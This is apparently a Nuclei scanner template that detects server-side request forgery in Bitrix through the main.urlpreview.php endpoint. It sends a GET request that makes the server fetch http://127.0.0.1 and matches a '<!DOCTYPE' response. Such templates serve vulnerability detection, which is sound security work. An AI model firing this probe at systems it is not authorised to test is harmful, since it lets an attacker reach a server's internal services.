id: bitrix-urlpreview-ssrf

info:
  name: Bitrix SSRF via main.urlpreview.php
  author: clevergod
  severity: high
  tags: bitrix,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/tools/main.urlpreview.php?url=http://127.0.0.1"
    matchers:
      - type: word
        part: body
        words:
          - "<!DOCTYPE"